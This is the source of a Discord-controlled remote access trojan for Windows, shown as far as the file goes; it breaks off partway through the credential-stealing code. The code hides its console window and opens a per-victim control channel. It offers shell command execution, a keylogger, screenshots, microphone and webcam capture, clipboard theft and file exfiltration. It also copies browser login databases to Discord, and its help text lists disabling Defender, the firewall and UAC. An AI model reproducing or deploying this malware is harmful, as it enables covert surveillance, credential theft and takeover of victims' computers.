import discord
from discord.ext import commands
import os
import sys
import platform
import datetime
import keyboard
import uuid
import socket
import mss
import io
import psutil
import time
import subprocess
import sounddevice as sd
import threading
from datetime import datetime, timezone
import io
import threading
import numpy as np
from discord import PCMAudio
import shutil
import requests
import winreg
import ctypes
from ctypes import windll, byref, c_uint, c_bool
import pyperclip
import cv2
import asyncio
import getpass
from PIL import Image

def hide():
    try:
        console_window = ctypes.windll.kernel32.GetConsoleWindow()
        ctypes.windll.user32.ShowWindow(console_window, 0)
    except Exception as e:
        print(f"{str(e)}")

hide()

def admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# CONFIG

TOKEN = 'YOUR_BOT_TOKEN_HERE' # UR BOT TOKEN HERE
command_pref = '!' # Command prefix is "!" on default.

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=command_pref, intents=intents, help_command=None)
ctrl_channel = None
selected_cam = 0
voice_client = None
camera_stream = None
audio_stream = None
streaming_audio = False
monitor_stream = None
streaming_monitor = False
selected_audio_device = 0

# START OF CODE
class ImprovedMicrophoneAudio(PCMAudio): # ChatGPT carried
    def __init__(self, streaming_flag):
        self.streaming = streaming_flag
        self.buffer = io.BytesIO()
        self.mic_stream = None
        self.start_stream()
        
    def start_stream(self):
        global selected_audio_device
        self.CHANNELS = 2
        self.RATE = 48000
        self.CHUNK = 1920
        
        devices = sd.query_devices()
        input_devices = [i for i, d in enumerate(devices) if d['max_input_channels'] > 0]
        
        if not input_devices:
            return
        
        device_id = selected_audio_device if selected_audio_device in input_devices else input_devices[0]    
            
        def callback(indata, frames, time_info, status): # ChatGPT carried
            if self.streaming and not status:
                # Convert to int16 PCM format with improved quality
                # Normalize the float32 data to avoid clipping
                normalized = np.clip(indata, -0.98, 0.98)
                data = (normalized * 32767).astype(np.int16).tobytes()
                self.buffer.write(data)
        
        try:
            self.mic_stream = sd.InputStream(
                device=device_id,
                callback=callback,
                channels=self.CHANNELS, 
                samplerate=self.RATE,
                dtype='float32',
                blocksize=self.CHUNK
            )
            self.mic_stream.start()
        except Exception as e:
            if selected_audio_device != input_devices[0]:
                selected_audio_device = input_devices[0]
                self.start_stream()
    
    def read(self):
        if not self.mic_stream or not self.streaming or self.buffer.getbuffer().nbytes == 0:
            return b'\x00' * (self.CHANNELS * self.CHUNK * 2)
            
        self.buffer.seek(0)
        data = self.buffer.read()
        self.buffer.seek(0)
        self.buffer.truncate()
        
        if len(data) < self.CHANNELS * self.CHUNK * 2:
            data += b'\x00' * (self.CHANNELS * self.CHUNK * 2 - len(data))
        elif len(data) > self.CHANNELS * self.CHUNK * 2:
            data = data[:self.CHANNELS * self.CHUNK * 2]
            
        return data
    
    def cleanup(self):
        if self.mic_stream:
            self.mic_stream.stop()
            self.mic_stream.close()
            self.mic_stream = None
        self.streaming = False

@bot.event
async def on_ready():
    global ctrl_channel
    
    pc_username = getpass.getuser()
    channel_name = f"ratted-{pc_username}"
    
    found_channel = False
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.name == channel_name.lower():
                ctrl_channel = channel
                found_channel = True
                break
        if found_channel:
            break
    
    if not found_channel:
        for guild in bot.guilds:
            try:
                ctrl_channel = await guild.create_text_channel(channel_name)
                break
            except:
                continue
    
    if ctrl_channel:
        ADMIN = admin()
        if ADMIN == "1":
            DADMIN = True
        else:
            DADMIN = False
        await ctrl_channel.send(f"New client: **{pc_username}** | Admin: **{DADMIN}** | `{command_pref}help`")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"Invalid command. Use `{command_pref}help` to see available commands.")

# Help command
@bot.command()
async def help(ctx):
    if ctx.channel != ctrl_channel:
        return

    help_chunks = [
        f"""
**Remote Administration Tool – Command List**

__Screen & Display__
- `{command_pref}screenshot [monitor_num]` – Take screenshot of a monitor (or all)
- `{command_pref}getmonitors` – List all available monitors
- `{command_pref}screenshare <monitor_num> [voice_channel_id]` – Start screen sharing
- `{command_pref}simpleshare <monitor_num> [interval]` – Periodic screenshots as screen share

__File Management__
- `{command_pref}ls <directory>` – List files in directory
- `{command_pref}file delete <path>` – Delete file or folder
- {command_pref}file upload <path>` – Upload file to Discord
- `{command_pref}file get <url> <path>` – Download file from URL
- `{command_pref}file copy <src> <dst>` – Copy file or directory
        """,

        f"""
__System Info & Control__
- `{command_pref}info` - Tons of information about the computer
- `{command_pref}admincheck` – Check admin privileges
- `{command_pref}shutdown` / `{command_pref}shutdown cancel` – Shutdown PC or cancel it
- `{command_pref}restart` – Restart PC
- `{command_pref}logoff` – Log off current user
- `{command_pref}cmd <command>` – Run shell command

__Networking & Audio__
- `{command_pref}voice <channel_link>` – Join voice and stream mic
- `{command_pref}voice leave` / `{command_pref}disconnect` – Leave voice channel
- `{command_pref}audio` – List audio input devices
- `{command_pref}selectaudio <number>` – Select audio device
- `{command_pref}mute` / `{command_pref}unmute` – Mute/unmute mic
        """,

        f"""
__Troll Tools__
- `{command_pref}troll tts <message>` – Text-to-speech
- `{command_pref}troll bluescreen` - Trigger a BSOD
- `{command_pref}troll wallpaper <url>` – Change wallpaper
- `{command_pref}troll lock/unlock mouse` – Lock/unlock mouse
- `{command_pref}troll lock/unlock keyboard` – Lock/unlock keyboard
- `{command_pref}troll azerty/qwerty` – Change keyboard layout
- `{command_pref}troll revertall` – Revert all troll changes

__Admin Functions (Requires admin)__
- `{command_pref}uac` – Attempt to gain administrator
- `{command_pref}disableuac` – Fully disable UAC from ever popping up
- `{command_pref}disabledefender` – Disable Windows Defender
- `{command_pref}disablefirewall` – Disable firewall
- `{command_pref}disabletaskmgr` / `{command_pref}enabletaskmgr` – Toggle Task Manager
        """,

        f"""
__Surveillance__
- `{command_pref}getcams` – List available webcams
- `{command_pref}selectcam <number>` – Select webcam
- `{command_pref}webcampic` – Take picture with webcam
- `{command_pref}clipboard` – Get clipboard content
- `{command_pref}keylogger start` / `{command_pref}keylogger stop` – Start and stop keylogger (60s interval)

__Process Management__
- `{command_pref}tasklist` – Show running processes
- `{command_pref}prockill <process_name>` – Kill a process

__Credential Stuff__
- `{command_pref}steal` – Lists supported services
- `{command_pref}steal <service>` – Extracts credentials or data (Chrome, Firefox, etc.)

__Other Utilities__
- `{command_pref}message <text>` – Show message box on screen
- `{command_pref}startup add/remove` – Add/remove from startup
- `{command_pref}uploadlink <url>` – Download file from web
- `{command_pref}website <url>` – Open URL on PC
- `{command_pref}exit` – Exit the RAT
        """
    ]

    for chunk in help_chunks:
        await ctx.send(chunk.strip())

# Audio command (for vc shit)
@bot.command()
async def audio(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    try:
        devices = sd.query_devices()
        
        input_devices = [(i, d) for i, d in enumerate(devices) if d['max_input_channels'] > 0]
        
        if not input_devices:
            await ctx.send("No audio input devices found.")
            return
        
        device_info = "**Available Audio Input Devices:**\n"
        for i, (idx, device) in enumerate(input_devices):
            device_info += f"**Device {idx}**: {device['name']} ({device['max_input_channels']} channels)\n"
        
        device_info += f"\n**Currently selected device**: {selected_audio_device}"
        await ctx.send(device_info)
    
    except Exception as e:
        await ctx.send(f"Error getting audio device info: {str(e)}")

# Select audio command (for selecting an audio device for wiretapping the microphone through a discord voice channel)
@bot.command()
async def selectaudio(ctx, device_index: int = 0):
    global selected_audio_device
    
    if ctx.channel != ctrl_channel:
        return
    
    try:
        devices = sd.query_devices()
        input_devices = [i for i, d in enumerate(devices) if d['max_input_channels'] > 0]
        
        if device_index not in input_devices:
            await ctx.send(f"Audio device {device_index} not found or is not an input device.")
            return
        
        selected_audio_device = device_index
        await ctx.send(f"Selected audio device {device_index}: {devices[device_index]['name']}")
        
        global streaming_audio, audio_stream, voice_client
        if streaming_audio and audio_stream and voice_client and voice_client.is_connected():
            if isinstance(audio_stream, ImprovedMicrophoneAudio):
                audio_stream.cleanup()
            
            audio_stream = ImprovedMicrophoneAudio(streaming_audio)
            
            if voice_client.is_playing():
                voice_client.stop()
            voice_client.play(audio_stream)
            
            await ctx.send("Audio stream restarted with new device.")
    
    except Exception as e:
        await ctx.send(f"Error selecting audio device: {str(e)}")

# Get all monitors command
@bot.command()
async def getmonitors(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            
            monitor_info = "**Available Monitors:**\n"
            for i, monitor in enumerate(monitors):
                if i == 0:
                    monitor_info += f"**Monitor {i}**: All monitors combined\n"
                else:
                    monitor_info += f"**Monitor {i}**: {monitor['width']}x{monitor['height']} at position ({monitor['left']}, {monitor['top']})\n"
            
            await ctx.send(monitor_info)
    except Exception as e:
        await ctx.send(f"Error getting monitor info: {str(e)}")

# Screenshot command
@bot.command()
async def screenshot(ctx, monitor_num="all"):
    if ctx.channel != ctrl_channel:
        return
    
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            
            if monitor_num.lower() == "all":
                monitor_index = 0
            else:
                try:
                    monitor_index = int(monitor_num)
                    if monitor_index < 0 or monitor_index >= len(monitors):
                        await ctx.send(f"Invalid monitor number. Use `{command_pref}getmonitors` to see available monitors.")
                        return
                except ValueError:
                    await ctx.send(f"Invalid monitor number. Use `{command_pref}getmonitors` to see available monitors.")
                    return
            
            await ctx.send(f"Taking screenshot of monitor {monitor_index}...")
            
            monitor = monitors[monitor_index]
            screenshot = sct.grab(monitor)
            
            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
            
            screenshot_path = f"screenshot_monitor_{monitor_index}.png"
            img.save(screenshot_path)
            
            await ctx.send(f"**Screenshot of Monitor {monitor_index}:**", file=discord.File(screenshot_path))
            
            os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {str(e)}")

active_keyloggers = {}

class Keylogger:
    def __init__(self, ctx):
        self.ctx = ctx
        self.log_buffer = ""
        self.running = False
        self.modifier_state = {
            "ctrl": False,
            "alt": False,
            "shift": False,
            "windows": False
        }
        
        self.special_keys = {
            "space": "SPACE",
            "enter": "ENTER",
            "backspace": "BACKSPACE",
            "tab": "TAB",
            "esc": "ESC",
            "delete": "DEL",
            "home": "HOME",
            "end": "END",
            "page up": "PGUP",
            "page down": "PGDN",
            "up": "UP",
            "down": "DOWN",
            "left": "LEFT",
            "right": "RIGHT",
            "maj": "SHIFT",
            "haut": "UP",
            "bas": "DOWN",
            "gauche": "LEFT",
            "droite": "RIGHT"
        }
        
        for i in range(1, 13):
            self.special_keys[f"f{i}"] = f"F{i}"

    def start(self, log_interval=60):
        if self.running:
            return False
            
        self.running = True
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log_interval = log_interval
        
        keyboard.hook(self.callback)
        
        self.report_timer = threading.Timer(self.log_interval, self.schedule_report)
        self.report_timer.daemon = True
        self.report_timer.start()
        
        return True

    def stop(self):
        if not self.running:
            return False
            
        keyboard.unhook(self.callback)
        if hasattr(self, 'report_timer') and self.report_timer:
            self.report_timer.cancel()
        
        if self.log_buffer:
            asyncio.run_coroutine_threadsafe(self.report(), self.ctx.bot.loop)
        
        self.running = False
        return True

    def callback(self, event):
        if not self.running:
            return
            
        if event.event_type == keyboard.KEY_DOWN:
            self.process_keydown(event)
        elif event.event_type == keyboard.KEY_UP:
            self.process_keyup(event)

    def process_keydown(self, event):
        key_name = event.name
        if not key_name:
            return
            
        key_name = key_name.lower()
        
        if key_name in ["ctrl", "alt", "shift", "windows", "control", "maj"]:
            if key_name == "control":
                key_name = "ctrl"
            elif key_name == "maj":
                key_name = "shift"
                
            self.modifier_state[key_name] = True
            return
        
        if key_name in self.special_keys:
            key_text = self.special_keys[key_name]
        elif len(key_name) == 1:
            key_text = key_name
        else:
            key_text = key_name.upper()
        
        active_mods = [mod.upper() for mod, active in self.modifier_state.items() if active]
        
        if active_mods:
            combo = "+".join(active_mods) + "+" + key_text
            self.log_buffer += f"[{combo}] "
        else:
            if len(key_text) == 1:
                self.log_buffer += key_text
            else:
                self.log_buffer += f"[{key_text}] "

    def process_keyup(self, event):
        key_name = event.name
        if not key_name:
            return
            
        key_name = key_name.lower()
        
        if key_name in ["ctrl", "alt", "shift", "windows", "control", "maj"]:
            if key_name == "control":
                key_name = "ctrl"
            elif key_name == "maj":
                key_name = "shift"
                
            self.modifier_state[key_name] = False

    def schedule_report(self):
        """Schedule the report coroutine to run in the bot's event loop"""
        if self.running:
            asyncio.run_coroutine_threadsafe(self.report(), self.ctx.bot.loop)
            
            if self.running:
                self.report_timer = threading.Timer(self.log_interval, self.schedule_report)
                self.report_timer.daemon = True
                self.report_timer.start()

    async def report(self):
        """Send the keylog report to Discord"""
        if not self.running:
            return
            
        if self.log_buffer:
            username = os.environ.get('USERNAME', 'Unknown')
            computer_name = os.environ.get('COMPUTERNAME', 'Unknown')
            
            try:
                import ctypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                window_title = buff.value
            except:
                window_title = "Unknown"
            
            report = f"```\nUser: {username} ({computer_name})\n"
            report += f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            report += f"Window: {window_title}\n"
            report += f"Keystrokes: {self.log_buffer}\n```"
            
            try:
                if len(report) > 1900:
                    chunks = [report[i:i+1900] for i in range(0, len(report), 1900)]
                    for chunk in chunks:
                        await self.ctx.send(chunk)
                else:
                    await self.ctx.send(report)
                    
                self.log_buffer = ""
            except Exception as e:
                await self.ctx.send(str({e}))
# Keylogger command
@bot.command()
async def keylogger(ctx, action="status", interval: int = 60):
    if ctx.channel != ctrl_channel:
        return
        
    guild_id = str(ctx.guild.id)
    
    if action.lower() == "start":
        if guild_id in active_keyloggers and active_keyloggers[guild_id].running:
            await ctx.send(f"Keylogger is already running. Use `{command_pref}keylogger stop` to stop it first.")
            return
        
        try:
            keylogger_instance = Keylogger(ctx)
            
            if keylogger_instance.start(interval):
                active_keyloggers[guild_id] = keylogger_instance
                await ctx.send(f"Keylogger started with reporting interval of {interval} seconds.")
            else:
                await ctx.send("Failed to start keylogger.")
        except Exception as e:
            await ctx.send(f"Error starting keylogger: {str(e)}")
            
    elif action.lower() == "stop":
        if guild_id not in active_keyloggers or not active_keyloggers[guild_id].running:
            await ctx.send("Keylogger is not currently running.")
            return
        
        try:
            if active_keyloggers[guild_id].stop():
                await ctx.send("Keylogger stopped successfully.")
                del active_keyloggers[guild_id]
            else:
                await ctx.send("Failed to stop keylogger.")
        except Exception as e:
            await ctx.send(f"Error stopping keylogger: {str(e)}")
            
    elif action.lower() == "status":
        if guild_id in active_keyloggers and active_keyloggers[guild_id].running:
            start_time = active_keyloggers[guild_id].start_time
            interval = active_keyloggers[guild_id].log_interval
            await ctx.send(f"Keylogger is currently running.\nStarted at: {start_time}\nReporting interval: {interval} seconds")
        else:
            await ctx.send("Keylogger is not currently running.")
            
    else:
        await ctx.send("Invalid action. Use `start`, `stop`, or `status`.")

# Screenshare command (not working, only simpleshare works since thats easy to code)
@bot.command()
async def screenshare(ctx, monitor_num="1"):
    global streaming_monitor, monitor_stream, voice_client
    
    if ctx.channel != ctrl_channel:
        return
    
    if monitor_num.lower() == "stop":
        streaming_monitor = False
        await ctx.send("Screen sharing stopped.")
        return
    
    try:
        try:
            monitor_index = int(monitor_num)
        except ValueError:
            await ctx.send(f"Invalid monitor number. Use `{command_pref}getmonitors` to see available monitors.")
            return
        
        if not voice_client or not voice_client.is_connected():
            await ctx.send(f"You need to join a voice channel first using `{command_pref}voice <channel_link>`")
            return
        
        await ctx.send(f"Starting screen sharing for monitor {monitor_index}. Type `{command_pref}screenshare stop` to stop sharing.")
        
        streaming_monitor = True
        
        temp_dir = os.path.join(os.environ['TEMP'], 'screenshare')
        os.makedirs(temp_dir, exist_ok=True)
        
        stream_thread = threading.Thread(target=stream_screen_to_discord, 
                                         args=(monitor_index, ctx, temp_dir))
        stream_thread.daemon = True
        stream_thread.start()
        
    except Exception as e:
        await ctx.send(f"Error starting screen share: {str(e)}")

# Fallback method for when screensharing doesn't work, this sends screenshots every x seconds.
@bot.command()
async def simpleshare(ctx, monitor_num="1", interval: int = 5): # interval: int = x is the interval in seconds
    global streaming_monitor
    
    if ctx.channel != ctrl_channel:
        return
    
    if monitor_num.lower() == "stop":
        streaming_monitor = False
        await ctx.send("Screen sharing stopped.")
        return
    
    try:
        monitor_index = int(monitor_num)
        streaming_monitor = True
        
        share_thread = threading.Thread(
            target=send_periodic_screenshots, 
            args=(monitor_index, ctx, interval),
            daemon=True
        )
        share_thread.start()
        
        await ctx.send(f"Started simple screen sharing for monitor {monitor_index}. Screenshots will be sent every {interval} seconds.")
        
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

def send_periodic_screenshots(monitor_index, ctx, interval):
    global streaming_monitor
    
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            
            if monitor_index < 0 or monitor_index >= len(monitors):
                asyncio.run_coroutine_threadsafe(
                    ctx.send(f"Invalid monitor index {monitor_index}"),
                    bot.loop
                )
                return
            
            monitor = monitors[monitor_index]
            
            while streaming_monitor:
                screenshot = sct.grab(monitor)
                
                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                
                img_byte_arr = io.BytesIO()
                img.save(img_byte_arr, format='JPEG', quality=70)
                img_byte_arr.seek(0)
                
                asyncio.run_coroutine_threadsafe(
                    ctx.send(file=discord.File(img_byte_arr, filename="screen.jpg")),
                    bot.loop
                )
                
                time.sleep(interval)
                
    except Exception as e:
        asyncio.run_coroutine_threadsafe(
            ctx.send(f"Screen sharing error: {str(e)}"),
            bot.loop
        )
# ChatGPT tried its best, but failed :P
def stream_screen_to_discord(monitor_index, ctx, temp_dir): # no clue how to make this, it don't work rn :O
    global streaming_monitor, voice_client
    
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            
            if monitor_index < 0 or monitor_index >= len(monitors):
                asyncio.run_coroutine_threadsafe(
                    ctx.send(f"Invalid monitor index {monitor_index}. Screen sharing stopped."),
                    bot.loop
                )
                return
            
            monitor = monitors[monitor_index]
            
            ffmpeg_path = os.path.join(temp_dir, "ffmpeg.exe")
            
            if not os.path.exists(ffmpeg_path):
                try:
                    ffmpeg_url = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl-shared.zip"
                    zip_path = os.path.join(temp_dir, "ffmpeg.zip")
                    
                    asyncio.run_coroutine_threadsafe(
                        ctx.send("Downloading FFmpeg for screen sharing..."),
                        bot.loop
                    )
                    
                    response = requests.get(ffmpeg_url, stream=True)
                    with open(zip_path, 'wb') as f:
                        for chunk in response.iter_content(chunk_size=8192):
                            f.write(chunk)
                    
                    import zipfile
                    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                        for file in zip_ref.namelist():
                            if file.endswith('ffmpeg.exe'):
                                zip_ref.extract(file, temp_dir)
                                os.rename(os.path.join(temp_dir, file), ffmpeg_path)
                                break
                    
                    os.remove(zip_path)
                    
                except Exception as e:
                    asyncio.run_coroutine_threadsafe(
                        ctx.send(f"Error downloading FFmpeg: {str(e)}. Using fallback method."),
                        bot.loop
                    )
                    stream_monitor_fallback(monitor_index, ctx)
                    return
            
            pipe_name = r'\\.\pipe\WindowsMediaPIayer'
            
            class ScreenShareSource(discord.PCMAudio):
                def __init__(self, pipe_name):
                    self.pipe = None
                    self.pipe_name = pipe_name
                
                def open_pipe(self):
                    try:
                        self.pipe = open(self.pipe_name, 'rb')
                    except:
                        pass
                
                def read(self):
                    try:
                        if not self.pipe:
                            self.open_pipe()
                        if self.pipe:
                            return self.pipe.read(3840)
                    except:
                        pass
                    return b'\x00' * 3840
            
            asyncio.run_coroutine_threadsafe(
                ctx.send("Setting up screen share stream..."),
                bot.loop
            )
            
            video_size = f"{monitor['width']}x{monitor['height']}"
            ffmpeg_cmd = [
                ffmpeg_path,
                '-f', 'gdigrab',
                '-framerate', '30',
                '-offset_x', str(monitor['left']),
                '-offset_y', str(monitor['top']),
                '-video_size', video_size,
                '-i', 'desktop',
                '-f', 's16le',
                '-ar', '48000',
                '-ac', '2',
                '-acodec', 'pcm_s16le',
                pipe_name
            ]
            
            ffmpeg_proc = subprocess.Popen(
                ffmpeg_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            screen_source = ScreenShareSource(pipe_name)
            
            if voice_client and voice_client.is_connected():
                if voice_client.is_playing():
                    voice_client.stop()
                voice_client.play(screen_source)
                
                asyncio.run_coroutine_threadsafe(
                    ctx.send("Screen sharing active! Video is being sent to the voice channel."),
                    bot.loop
                )
            
            while streaming_monitor and voice_client and voice_client.is_connected():
                time.sleep(1)
            
            ffmpeg_proc.terminate()
            
    except Exception as e:
        print(f"Screen sharing error: {str(e)}")
        if hasattr(ctx, 'send'):
            asyncio.run_coroutine_threadsafe(
                ctx.send(f"Screen sharing error: {str(e)}"),
                bot.loop
            )
# this works :)
def stream_monitor_fallback(monitor_index, ctx):
    global streaming_monitor, voice_client
    
    try:
        with mss.mss() as sct:
            monitors = sct.monitors
            monitor = monitors[monitor_index]
            
            asyncio.run_coroutine_threadsafe(
                ctx.send("Using fallback screen sharing method (sending images)"),
                bot.loop
            )
            
            while streaming_monitor and voice_client and voice_client.is_connected():
                screenshot = sct.grab(monitor)
                
                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                img = img.resize((854, 480))
                img_byte_arr = io.BytesIO()
                img.save(img_byte_arr, format='JPEG', quality=70)
                img_byte_arr = img_byte_arr.getvalue()
                
                if hasattr(ctx, 'send') and streaming_monitor:
                    asyncio.run_coroutine_threadsafe(
                        ctx.send(file=discord.File(io.BytesIO(img_byte_arr), filename="screen_preview.jpg")),
                        bot.loop
                    )
                
                time.sleep(5)
                
    except Exception as e:
        print(f"Screen sharing fallback error: {str(e)}")
        if hasattr(ctx, 'send'):
            asyncio.run_coroutine_threadsafe(
                ctx.send(f"Screen sharing error: {str(e)}"),
                bot.loop
            )

# Mute command for muting the audio from pc when in voice call
@bot.command()
async def mute(ctx):
    global streaming_audio, audio_stream, voice_client
    
    if ctx.channel != ctrl_channel:
        return
    
    if not voice_client or not voice_client.is_connected():
        await ctx.send("Not connected to any voice channel.")
        return
    
    streaming_audio = False
    if isinstance(audio_stream, ImprovedMicrophoneAudio):
        audio_stream.streaming = False
    
    await ctx.send("Microphone muted.")

# Mute command for muting the audio from pc when in vc
@bot.command()
async def unmute(ctx):
    global streaming_audio, audio_stream, voice_client
    
    if ctx.channel != ctrl_channel:
        return
    
    if not voice_client or not voice_client.is_connected():
        await ctx.send("Not connected to any voice channel.")
        return
    
    streaming_audio = True
    
    if isinstance(audio_stream, ImprovedMicrophoneAudio):
        audio_stream.streaming = True
    
    await ctx.send("Microphone unmuted.")

# Disconnect from vc command
@bot.command()
async def disconnect(ctx):
    global voice_client, streaming_audio, audio_stream
    
    if ctx.channel != ctrl_channel:
        return
    
    streaming_audio = False
    
    if isinstance(audio_stream, ImprovedMicrophoneAudio):
        audio_stream.cleanup()
        audio_stream = None
    
    if voice_client and voice_client.is_connected():
        await voice_client.disconnect()
        voice_client = None
        await ctx.send("Disconnected from voice channel.")
    else:
        await ctx.send("Not connected to any voice channel.")

# Tasklist command
@bot.command()
async def tasklist(ctx):
    if ctx.channel != ctrl_channel:
        return
    
    await ctx.send("Getting task list...")
    
    result = "PID\tName\tMemory Usage (MB)\n"
    
    for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
        try:
            process_info = proc.info
            memory_mb = process_info['memory_info'].rss / (1024 * 1024)
            result += f"{process_info['pid']}\t{process_info['name']}\t{memory_mb:.2f}\n"
        except:
            pass
    
    with open("tasklist.txt", "w") as f:
        f.write(result)
    
    await ctx.send(file=discord.File("tasklist.txt"))
    os.remove("tasklist.txt")

# Shutdown command
@bot.command()
async def shutdown(ctx, action=None):
    if ctx.channel != ctrl_channel:
        return
    
    if action and action.lower() == "cancel":
        os.system("shutdown /a")
        await ctx.send("Shutdown canceled.")
    else:
        os.system("shutdown /s /t 5")
        await ctx.send(f"Computer will shut down in 5 seconds. Use `{command_pref}shutdown cancel` to cancel.")

# Command prompt command
@bot.command()
async def cmd(ctx, *, command):
    if ctx.channel != ctrl_channel:
        return
    
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        if result.stdout:
            if len(result.stdout) > 1900:
                with open("cmd_output.txt", "w") as f:
                    f.write(result.stdout)
                await ctx.send(file=discord.File("cmd_output.txt"))
                os.remove("cmd_output.txt")
            else:
                await ctx.send(f"```{result.stdout}```")
        else:
            await ctx.send("Command executed with no output.")
        
        if result.stderr:
            await ctx.send(f"Error: ```{result.stderr}```")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

# File stuff command
@bot.command()
async def file(ctx, action=None, path=None, destination=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not action:
        await ctx.send(f"""
**File Command Usage:**
- `{command_pref}file delete <path>` - Deletes specified file
- `{command_pref}file upload <path>` - Uploads specified file to Discord
- `{command_pref}file get <url> <path>` - Downloads file from URL to path
- `{command_pref}file copy <source_path> <destination_path>` - Copies a file from source to destination
""")
        return
    
    if action.lower() == "delete":
        if not path:
            await ctx.send("Please specify a file path to delete.")
            return
        
        try:
            if os.path.isfile(path):
                os.remove(path)
                await ctx.send(f"**File deleted:** {path}")
            elif os.path.isdir(path):
                shutil.rmtree(path)
                await ctx.send(f"**Directory deleted:** {path}")
            else:
                await ctx.send(f"Path {path} does not exist.")
        except Exception as e:
            await ctx.send(f"Error deleting {path}: {str(e)}")
    
    elif action.lower() == "upload":
        if not path:
            await ctx.send("Please specify a file path to upload.")
            return
        
        try:
            if os.path.isfile(path):
                file_size = os.path.getsize(path)
                if file_size > 8 * 1024 * 1024:
                    await ctx.send("File is too large (>8MB) for Discord upload.")
                else:
                    await ctx.send(f"**Uploading file:** {path}", file=discord.File(path))
            else:
                await ctx.send(f"File {path} does not exist.")
        except Exception as e:
            await ctx.send(f"Error uploading {path}: {str(e)}")
    
    elif action.lower() == "get":
        if not path:
            await ctx.send(f"Please specify both URL and destination path. Usage: `{command_pref}file get <url> <path>`")
            return
        
        if not destination:
            await ctx.send(f"Please specify a destination path. Usage: `{command_pref}file get <url> <path>`")
            return
        
        try:
            response = requests.get(path, stream=True)
            with open(destination, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            await ctx.send(f"**File downloaded** from {path} and saved to {destination}")
        except Exception as e:
            await ctx.send(f"Error downloading file: {str(e)}")
    
    elif action.lower() == "copy":
        if not path or not destination:
            await ctx.send(f"Please specify both source and destination paths. Usage: `{command_pref}file copy <source> <destination>`")
            return
        
        try:
            if os.path.isfile(path):
                shutil.copy2(path, destination)
                await ctx.send(f"**File copied** from {path} to {destination}")
            elif os.path.isdir(path):
                shutil.copytree(path, destination)
                await ctx.send(f"**Directory copied** from {path} to {destination}")
            else:
                await ctx.send(f"Source path {path} does not exist.")
        except Exception as e:
            await ctx.send(f"Error copying file: {str(e)}")
    
    else:
        await ctx.send("Invalid action. Use delete, upload, get, or copy.")

# List directory command
@bot.command()
async def ls(ctx, directory=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not directory:
        directory = os.getcwd()
    
    try:
        files = os.listdir(directory)
        result = f"Contents of {directory}:\n\n"
        
        for file in files:
            file_path = os.path.join(directory, file)
            if os.path.isdir(file_path):
                result += f"📁 {file}/\n"
            else:
                size = os.path.getsize(file_path)
                size_str = f"{size} bytes"
                if size >= 1024:
                    size_str = f"{size/1024:.2f} KB"
                if size >= 1024 * 1024:
                    size_str = f"{size/(1024*1024):.2f} MB"
                
                result += f"📄 {file} ({size_str})\n"
        
        if len(result) > 1900:
            with open("directory_listing.txt", "w", encoding="utf-8") as f:
                f.write(result)
            await ctx.send(file=discord.File("directory_listing.txt"))
            os.remove("directory_listing.txt")
        else:
            await ctx.send(f"```{result}```")
    except Exception as e:
        await ctx.send(f"Error listing directory: {str(e)}")

# need a cd command actually, so we can ls other directories too..

# Stealing command
@bot.command()
async def steal(ctx, service=None):
    if ctx.channel != ctrl_channel:
        return
    
    if not service:
        await ctx.send("""
**Available services to steal credentials from:**
- `chrome` - Google Chrome
- `edge` - Microsoft Edge
- `opera` - Opera/Opera GX
- `firefox` - Mozilla Firefox
- `steam` - Steam
- `epic` - Epic Games
- `discord` - Discord
""")
        return
    
    service = service.lower()
    
    async def send_creds_file(creds_content, filename):
        creds_path = os.path.join(os.environ['TEMP'], filename)
        with open(creds_path, 'w', encoding='utf-8') as f:
            f.write(creds_content)
        await ctx.send(f"**{filename} data:**", file=discord.File(creds_path))
        os.remove(creds_path)
    
    try:
        if service == "chrome":
            chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 
                        'Google\\Chrome\\User Data\\Default\\Login Data')
            
            if not os.path.exists(chrome_path):
                await ctx.send("Chrome Login Data not found.")
                return
            
            temp_path = os.path.join(os.environ['TEMP'], 'chrome_login_data')
            shutil.copy2(chrome_path, temp_path)
            
            result = "Chrome Credentials (encrypted, requires decryption)\n\n"
            result += f"Login Data file copied from: {chrome_path}\n"
            result += "Note: This file contains encrypted credentials that need to be decrypted"
            
            await send_creds_file(result, "chrome_credentials.txt")
            
            await ctx.send("**Chrome Login Data file:**", file=discord.File(temp_path))
            os.remove(temp_path)
        
        elif service == "edge":
            edge_path = os.path.join(os.environ['LOCALAPPDATA'], 
                      'Microsoft\\Edge\\User Data\\Default\\Login Data')
            
            if not os.path.exists(edge_path):
                await ctx.send("Edge Login Data not found.")
                return
            
            temp_path = os.path.join(os.environ['TEMP'], 'edge_login_data')
            shutil.copy2(edge_path, temp_path)
            
